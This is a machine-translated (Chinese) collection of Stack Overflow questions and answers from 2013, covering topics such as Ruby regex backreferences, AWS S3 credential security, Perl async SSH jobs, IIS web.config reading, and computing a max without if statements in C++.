    private OnDateSelectedListener dateSetListener = new OnDateSelectedListener() 
       {
        public void onDateSelected(int arg0, int arg1) 
           {
    Log.d("RemindEA","92S onTimeSelected");
    intDD = arg0;
    intMM = arg1;
    Log.d("RemindEA","93S schedule:" + intDD + ":" +  intMM);
    //updateDisplay();
       }
         };

 //------------------------------------
 //  -----> ERROR: setOnDismissListener cannot be resolved to a type
    private setOnDismissListener textSetListener = new setOnDismissListener 
 //------------------------------------
       {
        private void textSetListener()  // bodySetListener ()
           {
        Log.d("RemindEA","100S BodyLisner");  //<- does not get here on <done>
        return;
           }
        }; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-07T17:40:55.783

经过数小时的猜测和错误，这行得通。

我不认为“返回 bodyDialog”有任何作用；我最终直接从侦听器更新了 EditText 字段。“arg0”有一个很长的对话框名称——没什么用处。但是你有它来防止编译错误。

这可能是 WIMMOne 独有的，没有虚拟键盘，您需要使用他们的文本输入对话框。

```
protected Dialog onCreateDialog(int id) 
   {
switch (id)
       . . . .  
       case BODY_DIALOG_ID:
          bodyDialog = new TextInputDialog(this);
          bodyDialog.setOnDismissListener(textSetListener);
          return bodyDialog;

private OnDismissListener textSetListener = new OnDismissListener() 
 {
@Override
public void onDismiss(DialogInterface arg0)
   {
     Log.d("RemindEA","101S BodyLisner" + arg0);
     String strxx = bodyDialog.getText();
     mBodyText.setText(strxx);

   }
 }; 
```

# ruby - Ruby 正则表达式 \1 对 gsub 意味着什么

> ID：15825872
> 
> 赞同：14
> 
> 时间：2013-04-05T04:22:43.377
> 
> 标签：ruby, regex, gsub

\1 有什么作用？

例如

```
"foo bar bag".gsub(/(bar)/,'car\1') 
```

我相信这与你如何使用括号有关，但我不太确定。有人可以向我解释吗？你能做像\2这样的事情吗？如果是这样，那会做什么？

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2013-04-05T04:30:22.173

您在搜索部分用括号括起来的每个项目将对应于替换部分中的一个数字`\1`、`\2`等。

在您的示例中，只有一个项目被括号包围，该`"(bar)"`项目，因此您放置 a`\1`的任何地方都是括号内的部分将被交换的位置。您可以`\1`多次输入，如果您想重复，这很方便找到的项目，所以你可以合法地写`car\1\1\1`，`"bar"`将被交换三遍。

没有用，`\2`因为括号中只有一项。但是，如果您有`(bar)(jar)`，那么`\1`将代表`"bar"`并且`\2`将代表`"jar"`。

你甚至可以做这样的事情：

```
\1\2\1\2\2\1 
```

这将成为：

```
barjarbarjarjarbar 
```

这是一个现实世界的例子，它派上用场。假设你有一个这样的名单：

```
Jones, Tom  
Smith, Alan  
Smith, Dave  
Wilson, Bud 
```

你想把它改成这样：

```
Tom Jones  
Alan Smith  
Dave Smith  
Bud Wilson 
```

您可以搜索：

```
(.+), (.+) 
```

并替换为：

```
\2 \1 
```

您也可以替换为：

```
\1: \2 \1 
```

这将成为：

```
Jones: Tom Jones  
Smith: Alan Smith  
Smith: Dave Smith  
Wilson: Bud Wilson 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2013-04-05T09:05:36.357

一般`\N`用正则表达式中指定的第N组替换。第一个匹配的组被引用，`\1`最大组数为 9。

一些例子：

```
# wrap every integer into brackets
'1 2 34'.gsub(/(\d+)/, '[\1]')
# => "[1] [2] [34]"

# gsub with two groups: swap couples of integers
'<1,2> <3,4>'.gsub(/(\d+),(\d+)/, '\2,\1')
# => "<2,1> <4,3>" 

# you can reference the same group more than once
'1 2 34'.gsub(/(\d+)/, '<\1,\1>')
#  => "<1,1> <2,2> <34,34>"

# a slightly more complex example
'Jim Morrison'.sub(/([A-Z])[a-z]+ ([A-Z][a-z]+)/, '\2 \1.')
# => "Morrison J." 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2013-04-05T04:24:07.557

使用您所说`\1`的那样，正则表达式中最后一次捕获的is 语法。`()`它说任何匹配的，用那个替换它。

您可以继续使用`()`组及其各自`\2`来继续替换您匹配的内容。

# amazon-web-services - 从桌面应用程序安全地访问 AWS S3

> ID：15825874
> 
> 赞同：0
> 
> 时间：2013-04-05T04:22:50.880
> 
> 标签：amazon-web-services, amazon-s3, boto

我在一个 S3 帐户中有来自多个用户的数据。我的桌面应用程序有一个身份验证系统，它让应用程序知道用户是谁以及在 S3 上访问哪个文件夹。但桌面应用程序具有整个 S3 文件夹的访问代码。

有人告诉我这不安全，因为黑客可能会破坏从应用程序到 S3 的请求并使用凭据下载所有数据。

这是真的？如果是这样，我该如何避免呢？（他说我需要 AWS 云中的客户端服务器，但这对我来说并不清楚......）

顺便提一句。我正在使用 Boto python 库来访问 S3。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T05:01:13.023

我刚发现[这个](https://forums.aws.amazon.com/thread.jspa?messageID=42373&#42373)：

1.  不要将您的 AWS 密钥存储在应用程序中。一个坚定的黑客最终将能够找到它。一种想法是，您在某处托管了一个 Web 服务，其唯一目的是使用密钥签署客户端的 S3 请求，然后将这些请求中继到 S3 服务。因此，您可以让您的用户使用您控制的凭据对您的 Web 服务进行身份验证。重申一下：客户直接与 S3 对话，但让他们的请求得到您的“橡皮图章”/批准。

2.  我不认为 S3 一定是一个平面结构 - 如果您使用文件系统表示法“文件夹/子文件夹/file.ext”作为键。

3.  S3 支持虚 URL，请参阅[http://docs.amazonwebservices.com/AmazonS3/2006-03-01/VirtualHosting.html](http://docs.amazonwebservices.com/AmazonS3/2006-03-01/VirtualHosting.html) - 基本上 URL“ [http://s3.amazonaws.com/mybucket/myfile.ext](http://s3.amazonaws.com/mybucket/myfile.ext) ”变为“ [http://mybucket.s3.amazonaws.com/myfile.ext](http://mybucket.s3.amazonaws.com/myfile.ext) ” 然后您可以在您的 DNS 中设置一个 CNAME ，将“www.myname.com” 映射到 “mybucket.s3.amazonaws.com” 这会导致“ [http://www.myname.com/myfile.ext](http://www.myname.com/myfile.ext) "

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-05T05:16:46.720

时间恰好！AWS 昨天刚刚宣布了一项可能对您有所帮助的功能：[IAM 策略中的变量](http://aws.typepad.com/aws/2013/04/variables-in-aws-access-control-policies.html)。

您要做的是为每个用户创建一个 IAM 帐户。这将允许您为每个用户拥有单独的访问密钥和秘密密钥。然后，您将根据用户名将策略分配给您的存储桶，以限制对存储桶的一部分的访问。（我上面链接到的例子就是这个用例的一个很好的例子）。

# ruby - 只有最后一个参数被传递到对象

> ID：15825876
> 
> 赞同：0
> 
> 时间：2013-04-05T04:23:06.970
> 
> 标签：ruby, ruby-on-rails-3.2, actiondispatch

我的应用程序应该为表单输入字段中选择的每个图像创建一个图像对象。它——创建动作——迭代`:picture`参数，并且对于每个条目，它应该创建一个新的图像对象。但是，它似乎只为输入框中选择的最后一个图像创建一个图像对象。为什么这不能正常运行？

**控制器**

```
class Admin::ImagesController < ApplicationController
    respond_to :html, :json
    #before_filter :split_hash, :only => [ :create, :update ]
    def index
        @album = Album.find(params[:album_id])
        @images = @album.images.all
    end
    def new
        @album = Album.find(params[:album_id])
        @image = @album.images.new
    end
    def create
        params[:image][:picture].each do |image|
            @album = Album.find(params[:album_id])
            @params = {}
            @params['picture'] = image
            @image = @album.images.build(@params)
       end
        if @image.save
            flash[:notice] = "Successfully added image!"
            redirect_to [:admin, @album, :images]
        else
            render "new"
            flash[:notice] = "Did not successfully add image :("
        end
    end
    def show
        @album = Album.find(params[:album_id])
        @image = @album.images.find(params[:id])
    end
    def edit
        @album = Album.find(params[:album_id])
        @image = @album.images.find(params[:id])
    end
    def update
        @album = Album.find(params[:album_id])
        @image = @album.images.find(params[:id])
        if @image.update_attributes(params[:image])
            flash[:notice] = "Successfully updated Image"
            redirect_to [:admin, @album, :images]
        else
            render "edit"
        end
    end
    def destroy
        @album = Album.find(params[:album_id])
        @image = @album.images.find(params[:id])
        @image.destroy
        @albumid = @album.id
        @id = @image.id
        FileUtils.remove_dir("#{Rails.root}/public/uploads/image/picture/#{@albumid}/#{@id}", :force => true)
        redirect_to admin_album_images_path(@album)
    end
  #     def split_hash
  #         @album = Album.find(params[:album_id])
        # @image = @album.images
  #     array_of_pictures = params[:image][:picture]
  #     array_of_pictures.each do |pic|
  #         size = array_of_pictures.size.to_i
  #         size.times {@image.build(params[:image], :picture => pic)}
  #         @image.save
        # end
  #     end
end 
```

**查看表格**

```
<%= form_for([:admin, :album, @image], :html => {:multipart => true}) do |f| %>
        <%= f.hidden_field :album_id, :value => @album.id %>
        <%= f.file_field :picture, :multiple => true %>
        <%= f.submit "Submit" %>
<%end%> 
```

**提交时请求参数**

```
{"image"=>{"picture"=>[#<ActionDispatch::Http::UploadedFile:0x10c986d88 @tempfile=#<File:/var/folders/bx/6z1z5yks56j40v15n43tjh1c0000gn/T/RackMultipart20130404-53101-3c2whv-0>,
 @headers="Content-Disposition: form-data; name=\"image[picture][]\"; filename=\"background-pic.jpg\"\r\nContent-Type: image/jpeg\r\n",
 @content_type="image/jpeg",
 @original_filename="background-pic.jpg">,
 #<ActionDispatch::Http::UploadedFile:0x10c986d60 @tempfile=#<File:/var/folders/bx/6z1z5yks56j40v15n43tjh1c0000gn/T/RackMultipart20130404-53101-bvdysw-0>,
 @headers="Content-Disposition: form-data; name=\"image[picture][]\"; filename=\"bible-banner.png\"\r\nContent-Type: image/png\r\n",
 @content_type="image/png",
 @original_filename="bible-banner.png">],
 "album_id"=>"10"},
 "authenticity_token"=>"dr8GMCZOQo4dQKgkM4On2uMs8iORQ68vokjW0e4VvLY=",
 "commit"=>"Submit",
 "utf8"=>"✓",
 "album_id"=>"10"} 
```

我将不胜感激您可以分享的任何帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T04:27:22.250

`@album.images.build`只会创建对象，不会将其保存到数据库中。当您退出`each`循环时，`@image`只是构建的最后一个图像（这将是参数中的最后一个图像）。

使用`@album.images.create`实际上会将图像保存到数据库中，以便它像您期望的那样持久化；但是，您在块之后的逻辑`each`将不再有效，因为您只会验证最后一张图像是否已保存。您应该检查每个图像是否保存在每个块内，并以某种方式记录哪些图像不成功，如果这是您想要做的。

# perl - 如何异步运行多个perl open命令并按顺序显示输出

> ID：15825879
> 
> 赞同：1
> 
> 时间：2013-04-05T04:23:18.303
> 
> 标签：perl, asynchronous

我正在尝试对多个服务器异步运行多个 SSH 命令，我想捕获命令的输出并按顺序显示它们。要添加一个额外的曲线球，我希望 pid3 仅在 pid2 完成后运行，而 pid4 在前三个命令完成后运行。这将如何最好地完成？

*例子：*

```
// $pid1 and $pid2 should run asynchronously
my $pid1 = open(my $SSH1, "|ssh -t -t runuser\@$server{'app'} 'sudo chef-client'");

my $pid2 = open(my $SSH2, "|ssh -t -t runuser\@$server{'auth'} 'sudo chef-client'");

// This command should wait for $pid2 to complete.
my $pid3 = open(my $SSH3, "|ssh -t -t runuser\@$server{'auth'} \"sudo -- sh -c '$update_commands'\"");

// This command should wait for $pid1-3 to complete before running.
my $pid4 = open(my $SSH4, "|ssh -t -t runuser\@$server{'varn'} \"sudo -- sh -c '$varn_commands'\""); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T04:51:04.083

到目前为止我的（有点粗略的）解决方案。我觉得在 Perl 中可能有一种更优雅的方式来处理这个问题，但这可能会完成工作：

```
# Silence all non-error output from the commands on first 2 servers:
my $pid1 = open(my $SSH1, "|ssh -t -t runuser\@$server{'app'} 'sudo chef-client > /dev/null'");

my $pid2 = open(my $SSH2, "|ssh -t -t runuser\@$server{'auth'} 'sudo chef-client > /dev/null'");

if ($pid1) {
    print "Connecting to $server{'app'}: chef-client";
    while ( <$SSH1> ) {
        print $server{'app'};
        print $_;
    }
}
close $SSH1 or die $!;

if ($pid2) {
    print "Connecting to $server{'auth'}: chef-client";
    while ( <$SSH2> ) {
        print $server{'auth'};
        print $_;
    }
}
close $SSH2 or die $!;

# Run pid3 once pid2 is closed
my $pid3 = open(my $SSH3, "|ssh -t -t runuser\@$server{'auth'} \"sudo -- sh -c '$update_command'\"");
if ($pid3) {
    print "Connecting to $server{'auth'}: $update_command";
    while ( <$SSH3> ) {
        print $_;
    }
}
close $SSH3 or die $!;

# Run pid4 after all previous commands have completed.
my $pid4 = open(my $SSH4, "|ssh -t -t runuser\@$server{'varn'} \"sudo -- sh -c '$varn_command'\"");
if ($pid4) {
    print "Connecting to $server{'varn'}: $varn_command";
    while ( <$SSH4> ) {
        print $_;
    }
}
close $SSH4 or die $!; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-05T15:51:24.763

[`Forks::Super`](http://search.cpan.org/perldoc?Forks%3a%3aSuper)处理所有这些要求：

```
use Forks::Super;

# run  $command1  and  $command2 , make stderr available
my $job1 = fork { cmd => $command1, child_fh => 'err' };
my $job2 = fork { cmd => $command2, child_fh => 'err' };

# job 3 must wait for job 2\. Collect stdout, stderr
my $job3 = fork { cmd => $command3, depend_on => $job2, child_fh => 'out,err' };

# and job 4 waits for the other 3 jobs
my $job4 = fork { cmd => $command4, depend_on => [ $job1, $job2, $job3 ],
                  child_fh => 'out,err' };

# wait for jobs to finish, then we'll collect output
$_->wait for $job1, $job2, $job3, $job4;
my @output1 = $job1->read_stderr;
my @output2 = $job2->read_stderr;
my @output3 = ($job3->read_stdout, $job3->read_stderr);
my @output4 = ($job4->read_stdout, $job4->read_stderr);
... 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-07T21:51:48.263

使用[Net::OpenSSH::Parallel](https://metacpan.org/module/Net%3a%3aOpenSSH%3a%3aParallel)：

```
# untested!
use Net::OpenSSH::Parallel;
my $pssh = Net::OpenSSH::Parallel->new;

$pssh->add_server(app  => $server{app},  user => 'runuser');
$pssh->add_server(auth => $server{auth}, user => 'runuser');
$pssh->add_server(varn => $server{varn}, user => 'runuser');

$pssh->push('app',  cmd  => @cmd1);
$pssh->push('auth', cmd  => @cmd2);
$pssh->push('auth', cmd  => @cmd3);
$pssh->push('varn', join => '*');
$pssh->push('varn', cmd  => @cmd4);

$pssh->run; 
```

如果您需要传递密码，自动化`sudo`会稍微复杂一些，但仍然可以完成。它在模块文档中进行了解释。

# c# - 尝试从 Windows 服务读取 IIS 站点的 web.config 文件

> ID：15825883
> 
> 赞同：2
> 
> 时间：2013-04-05T04:23:45.490
> 
> 标签：c#, asp.net, iis, service, web-config

我正在尝试为`web.config`安装在本地 IIS 上的网站查找特殊文件。我从 Windows 服务进行此搜索。我执行以下操作：

```
using (ServerManager serverManager = new ServerManager())
{
    for (int r = 0; r < serverManager.Sites.Count; r++)
    {
        string strSiteName = serverManager.Sites[r].Name;
        ApplicationCollection arrApps = serverManager.Sites[r].Applications;

        for (int a = 0; a < arrApps.Count; a++)
        {
            Microsoft.Web.Administration.Application aa = arrApps[a];
            foreach (VirtualDirectory vd2 in aa.VirtualDirectories)
            {
                string strPhysPath = Environment.ExpandEnvironmentVariables(vd2.PhysicalPath);
                int rr = 0;

                try
                {
                    Configuration cnfg = serverManager.GetWebConfiguration(strSiteName, strPhysPath);
                    if (cnfg != null)
                    {
                        string swww = getWebConfigGeneralParamValue(cnfg, "SpecNodeName");
                    }
                }
                catch
                {
                    //Error
                }

            }
        }

    } 
```

在哪里，

```
public static string getWebConfigGeneralParamValue(Configuration config, string strParamKey)
{
    string strRes = null;

    try
    {
        ConfigurationSection configSection1 = config.GetSection("configuration");
        if (configSection1 != null)
        {
            ConfigurationElement configGeneralParams = configSection1.GetChildElement("GeneralParams");
            if (configGeneralParams != null)
            {
                ConfigurationElementCollection configCol = configSection1.GetCollection();
                if (configCol != null)
                {
                    strRes = configCol[strParamKey].ToString();
                }
            }
        }
    }
    catch(Exception ex)
    {
        strRes = null;
    }

    return strRes;
} 
```

这个脚本应该识别的 web.config 文件是这样的：

```
<?xml version="1.0"?>
<!--
  For more information on how to configure your ASP.NET application, please visit
  http://go.microsoft.com/fwlink/?LinkId=169433
  -->
<configuration>
 <!-- regular ASP.NET config stuff -->
 <GeneralParams>
  <param key="SpecNodeName" value="Special Node Value"/>
 </GeneralParams>
</configuration> 
```

但我得到的是`config.GetSection("configuration");`抛出这个异常：

> {"文件名：\\?\C:\inetpub\wwwroot\C:\Users\Dev\Desktop\CSharp\MyTestWebApp\MyTestWebApp\web.config\r\n错误：无法读取配置部分'配置'，因为它是缺少部分声明\r\n\r\n"}

知道如何使它工作吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T09:00:55.777

我感觉，如果你有 web.config 为什么要使用 ServerManager。看看下面的代码，我一直在我的代码中使用它，它就像一个魅力。它的作用是以可读格式加载 web.config。

```
var assemblyPath = Path.GetDirectoryName(typeof (ConfigurationTests).Assembly.Location);
            string webConfigPath = MyPath;
            string directory = System.IO.Path.GetFullPath(Path.Combine(assemblyPath,webConfigPath));
            Console.WriteLine(directory);
            Assert.That(Directory.Exists(directory));

            VirtualDirectoryMapping vdm = new VirtualDirectoryMapping(directory, true);
            WebConfigurationFileMap wcfm = new WebConfigurationFileMap();
            wcfm.VirtualDirectories.Add("/", vdm);
            System.Configuration.Configuration webConfig = WebConfigurationManager.OpenMappedWebConfiguration(wcfm, "/");

            var connectionString = webConfig.ConnectionStrings.ConnectionStrings["ConnectionString"].ConnectionString;

            Console.WriteLine("Connection String:");
            Console.WriteLine(connectionString);

            Console.WriteLine("AppSettings:");
            foreach (var key in webConfig.AppSettings.Settings.AllKeys)
            {
                Console.WriteLine("{0} : {1}", key, webConfig.AppSettings.Settings[key].Value);
            } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T05:15:07.370

您不需要针对配置，您需要针对需要从中获取数据的特定节点。这是示例。

```
using(ServerManager mgr = ServerManager.OpenRemote("Some-Server")) {

  Configuration config = mgr.GetWebConfiguration("site-name", "/test-application");

  ConfigurationSection appSettingsSection = config.GetSection("appSettings");

  ConfigurationElementCollection appSettingsCollection = appSettingsSection.GetCollection();

  ConfigurationElement addElement = appSettingsCollection.CreateElement("add");
  addElement["key"] = @"NewSetting1";
  addElement["value"] = @"SomeValue";
  appSettingsCollection.Add(addElement);

  serverManager.CommitChanges();
} 
```

# ruby-on-rails - 通过 Bundler 和挂载的应用程序加载本地 gem

> ID：15825896
> 
> 赞同：2
> 
> 时间：2013-04-05T04:25:11.757
> 
> 标签：ruby-on-rails, sinatra, bundler, rack, gemspecs

我正在创建一个 gem（我们称之为它`mygem`），它本质上是一个 Sinatra 服务器，旨在安装在基于 Rack 的应用程序中。

在我的 gem 的 gemspec 文件中，我有以下内容：

```
gem.add_dependency 'kss' 
```

在我的 gem 的 Gemfile 中，我有以下内容

```
source 'https://rubygems.org'

gemspec

gem "kss", :path => "/Users/me/code/kss" 
```

现在，当从`mygem`'s 文件夹中运行服务器时，这完全符合预期：它不会获取 kss 依赖项，而是会在我的本地驱动器上查找并加载该版本。

当我添加`mygem`到 Rails 测试应用程序 Gemfile 时，问题就出现了。在我的 Rails 测试应用程序 Gemfile 中，我有以下行：

```
gem "mygem", :path => "/Users/me/code/mygem" 
```

我希望在 a`bundle install`上，Bundler 将加载`mygem`及其依赖项；但是对于`kss`依赖项，Bundler 实际上并没有加载本地依赖项，而是提取到 ruby​​gems 以查找并加载它。我假设是因为在这种情况下，它只是从 gemspec 行中读取，而不包括我的依赖项覆盖。

我能做些什么来解决这种行为吗？我非常希望能够在本地运行和测试这些东西，但是 Bundler 似乎无法识别来自更高级别应用程序的依赖项覆盖。

如果我以错误的方式处理此问题，我完全愿意接受任何建议或更改。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T04:38:09.013

gemspec 中列出的依赖项将成为实现应用程序的依赖项，而 Gemfile 中定义的依赖项不会成为实现应用程序的依赖项。我认为您应该能够简单地将 Rails 测试应用程序 Gemfile 调整为：

```
gem "kss", :path => "/Users/me/code/kss"
gem "mygem", :path => "/Users/me/code/mygem" 
```

# javascript - 使用javascript的视频效果

> ID：15825898
> 
> 赞同：1
> 
> 时间：2013-04-05T04:25:14.443
> 
> 标签：javascript, video

谁能告诉我如何获得[此](http://www.bkwld.com/)页面上显示的视频效果？它具有 100% 的宽度，响应迅速并使用 Javascript。

如果您有任何代码示例，那就太好了。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T04:28:23.140

该网站正在使用 HTML5 视频标签。这是由 Google Chrome 呈现的源代码：

```
<video loop="loop" poster="/video/features/main.jpg" style="width: 1263px; height: 711px; top: -186.5px; left: 0px;">
  <source src="/video/features/main.webm" type="video/webm">
  <source src="/video/features/main.mp4" type="video/mp4">
</video> 
```

该标签显然仅在兼容 HTML5 的浏览器中可用，可以播放视频文件。这就是它在这种情况下所做的事情。

第一个源是主要视频源，如果第一个视频格式不受支持，MP4 是备用。loop 属性允许您为正在播放的视频设置循环，并且海报是在用户播放或搜索之前显示的图像。

看看[MDN 页面](https://developer.mozilla.org/en-US/docs/HTML/Element/video)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-18T22:55:01.543

BKWLD 开发人员在这里。我们使用外部 div 设置为`overflow: hidden`，然后使用 JavaScript 缩放 + 定位视频标签，基于 16:9 的纵横比。

这是每个窗口调整大小事件发生的简化示例
：( [https://gist.github.com/danro/5408291](https://gist.github.com/danro/5408291) )

```
// Depends on jQuery
// Assumes outerDiv and videoTag are jQuery objects

var width = outerDiv.width();
var height = outerDiv.height();
var aspectW = 16;
var aspectH = 9;
var scaleX = width / aspectW;
var scaleY = height / aspectH;
var scale = Math.max(scaleX, scaleY);
var w = Math.ceil(aspectW * scale);
var h = Math.ceil(aspectH * scale);
var x = 0;
var y = 0;
if (w > width) x = -(w-width)*0.5;
if (h > height) y = -(h-height)*0.5;

videoTag.css({
  width: w,
  height: h,
  top: y,
  left: x
}); 
```

# asp.net-mvc - MVC - 如何在 mvc3 中使用 ajax 下载 csv 文件

> ID：15825900
> 
> 赞同：2
> 
> 时间：2013-04-05T04:25:33.137
> 
> 标签：asp.net-mvc, jquery, export-to-csv

我在使用*$.ajax() 下载 csv 文件时遇到问题；*代码。

我有一个控制器，它返回如下文件。

```
public ActionResult ExportEx()
{
   StringBuilder sb = new StringBuilder();
        sb.Append("<table>");            
        sb.Append("<tr>");
        sb.Append("<td>1</td>");
        sb.Append("<td>2</td>");
        sb.Append("<td>3</td>");
        sb.Append("<td>4</td>");
        sb.Append("</tr>");
        sb.Append("<table>");         

    HttpContext.Response.AddHeader("content-disposition", "attachment; filename=student_" + DateTime.Now.Year.ToString() + ".xls");
    this.Response.ContentType = "application/vnd.ms-excel";
    byte[] buffer = System.Text.Encoding.UTF8.GetBytes(sb.ToString());
    return File(buffer, "application/vnd.ms-excel");
} 
```

我有 index.cshtml 文件如下

```
<input type="submit" value="Export To Excel" title="Export To excel" />        

<script type="text/javascript">
    $(".tt").click(function () {
        $.ajax({
            url: '/Home/ExportEx',
            type: 'POST',
            data: {},
            success: function (data) { },
            complete: function (data) { }
        });
    });
</script> 
```

如果我打电话使用`<a class="tt" href="@Url.Action("ExportEx", new { })">export</a>`我可以下载 csv 文件。但是通过`$.ajax`电话我无法下载。

请帮助我。

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-11T23:41:07.997

```
 $('button').click(function () {
            window.location.href = '/Home/ExportEx';
        }); 
```

# c++ - 在没有条件 IF 语句的情况下查找 MAX 个数字 c++

> ID：15825908
> 
> 赞同：1
> 
> 时间：2013-04-05T04:26:16.750
> 
> 标签：c++, if-statement

所以我也从用户输入中得到两个数字，并在不使用 if 语句的情况下找到这两个数字的最大值。

该课程是初学者课程，我们也使用了我们已经知道的内容。我有点想出办法，但只有先输入最大数字的数字才有效。

```
#include <iostream>
using namespace std;

int main()
{
int x = 0, y = 0, max = 0;
int smallest, largest;

cout << "Please enter 2 integer numbers, and i will show you which one is larger:      ";
cin >> x >> y;

smallest = (x < y == 1) + (x - 1);
smallest = (y < x == 1) + (y - 1);

largest = (x < y == 1) + (y - 1);
largest = (y > x == 1) + (x + 1 - 1);

cout << "Smallest: " << smallest << endl;
cout << "Largest: " << largest << endl;

return 0;
} 
```

到目前为止，这就是我所拥有的，但是在放入不同的测试数据后，我发现它仅适用于 4,5 或 6,7 等数字。但是彼此之间有超过 2 个空格的数字，例如 4,8 或 5, 7。任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T04:44:50.797

我在 Cracking the Coding 面试书中看到了这个问题。

让我们尝试通过“重新措辞”这个问题来解决这个问题 我们将重新措辞这个问题，直到我们得到一些删除所有 if 语句的东西

改写1：如果a > b，返回a；否则，返回 b
改写 2：如果 (a - b) 为负数，则返回 b；否则，返回一个
重新措辞 3：如果 (a - b) 为负，则令 k = 1；否则，令 k = 0 返回 a - k * (a - b)
改写 4：令 c = a - b 令 k = c 的最高有效位 返回 a - k * c

```
int getMax(int a, int b) { 
    int c = a - b;
    int k = (c >> ((sizeof(int) * CHAR_BIT) - 1)) & 0x1; 
    int max = a - k * c; 
    return max;
} 
```

来源：[http ://www.amazon.com/Cracking-Coding-Interview-Programming-Questions/dp/098478280X](https://rads.stackoverflow.com/amzn/click/com/098478280X)

编辑：即使 ab 溢出，此代码也有效。令 k 等于 ab 的符号，如果 ab >=0，则 k 为 1，否则 k=0。令 q 为 k 的倒数。当 a 为正数或 b 为负数时，上面的代码会溢出，反之亦然。如果 a 和 b 有不同的符号，那么我们希望 k 等于 sign(a)。

```
/* Flips 1 to 0 and vice-versa */
public static int flip(int bit){
   return 1^bit;
}

/* returns 1 if a is positive, and 0 if a is negative */
public static int sign(int a){
     return flip((a >> ((sizeof(int) * CHAR_BIT) - 1)) & 0x1);
}

public static int getMax(int a, int b){
   int c = a - b;
   int sa = sign(a-b);   // if a>=0, then 1 else 0
   int sb = sign(a-b);   // if b>=1, then 1 else 0
   int sc = sign(c);     // depends on whether or not a-b overflows

   /* If a and b have different signs, then k = sign(a) */
   int use_sign_of_a = sa ^ sb;

   /* If a and b have the same sign, then k = sign(a - b) */
   int use_sign_of_c = flip(sa ^ sb);

   int k = use_sign_of_a * sa + use_sign_of_c * sc;
   int q = flip(k);   //opposite of k

   return a * k + b * q;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-05T05:18:21.127

这是一个有趣的解决方案：

```
int max_num = (x>y)*x + (y>=x)*y; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-05T04:37:13.413

您可以尝试使用此代码来查找`max`和`min`两个输入变量。

```
((a > b) && (max = a)) || (max=b);
((a < b) && (min = a)) ||  (min=b); 
```

对于三个输入变量，您可以使用类似的方法，如下所示：

```
int main()
{
    int a = 10, b = 9 , c = 8;
    cin >> a >> b >> c;
    int max  = a, min = a;
    // For Max
    ((a > b) && (a > c) && (max=a)) || 
           ((b > c) && (b > a) && (max=b)) || 
           (max=c) ;

    // For min
    ((a < b) && (a < c) && (min=a)) || 
         ((b < c) && (b < a) && (min=b)) || 
         (min=c) ;

    cout << "max = " << max;
    cout << "and min = " << min;
    return 1;
} 
```

一次运行是：

```
:~$ ./a.out 
1
2
3
max = 3 and min = 1 
```

**编辑**

感谢@Tony D：此代码将因负数而失败。

可以尝试对两个输入的负数进行此操作以找到最大值（不确定）：

```
((a > b) && ( a > 0 && (max = a))) ||  ((b > a) && (max = b)) || (max = a); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-05T04:53:49.003

假设您已经涵盖了按位运算符，您可以这样做：

```
max = a-((a-b)&((a-b)>>(sizeof(int)*8-1))); 
```

这是基于@user93353 在上面的评论中指出的在[数学上找到没有条件比较的最大值的解决方案。](https://stackoverflow.com/questions/1375882/mathematically-find-max-value-without-conditional-comparison)

如果你真的只是想避免 if 语句，而不是一般的比较，这可能是矫枉过正。

# algorithm - 大量集合的集合大小

> ID：15825909
> 
> 赞同：3
> 
> 时间：2013-04-05T04:26:19.657
> 
> 标签：algorithm, set

我有一个用例，我需要存储大量条目，每个条目具有唯一的集合大小。如果我们将其简化为联系人（问题不是很大）。我们会遇到这样的问题：

假设用户知道他们有多少朋友：

乔 - 玛丽、约翰、鲍勃、汤姆

玛丽 - 卡罗尔、苏西、迈克、弗雷德、罗伯特

因此`friends(Joe) = 4`，唯一支持的操作是`addFriend(Joe, Sam)`. 虽然 Mary 可能与 Joe 成为朋友，但无需存储任何相关信息。

我不想做的是存储每组中的所有条目，但是布隆过滤器感觉不太对。还有其他选择吗？

**更新：**挑战在于我有 20M Joe/Mary/... 在顶级集合中，每个集合中有 400 万半不同成员。快速代码示例如下（为简单起见，python）-但在规模+持久存储中，宇宙走到了尽头。

```
class World:
    def __init__(self):
        self.friends = defaultdict(set)

    def addFriend(self, id, member):
        self.friends[id].add(member)

    def friends(self, id):
        return len(friends[id]) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T12:38:47.197

由于您正在考虑使用 Bloom 过滤器，因此听起来近似答案就可以了。使用[HyperLogLog](https://stackoverflow.com/questions/12327004/how-does-the-hyperloglog-algorithm-work)之类的小空间基数估计器代替`self.friends`.

# scala - 如何在 IDEA 12 中使用外部 Scala 编译器？

> ID：15825914
> 
> 赞同：7
> 
> 时间：2013-04-05T04:27:42.013
> 
> 标签：scala, intellij-idea

你如何在 IDEA 中使用外部 Scala 编译器？我似乎随机出现错误说*“scala：无法连接到 localhost/127.0.0.1:3200 的编译服务器”*

有时它会起作用。有时它不会。我找不到模式。

这是我在日志中的内容

```
9:20:58 PM Auto make completed with errors
9:21:09 PM Using a new (SBT-based) Scala compiler.
           In case of any compilation problems you may enable the previous (internal) compiler by clearing:
           Project Settings / Compiler / Use external build
9:21:10 PM Scala compile server
           Error: Could not create the Java Virtual Machine.
           Error: A fatal exception has occurred. Program will exit.

9:21:12 PM Compilation completed with 1 error and 0 warnings in 3 sec 
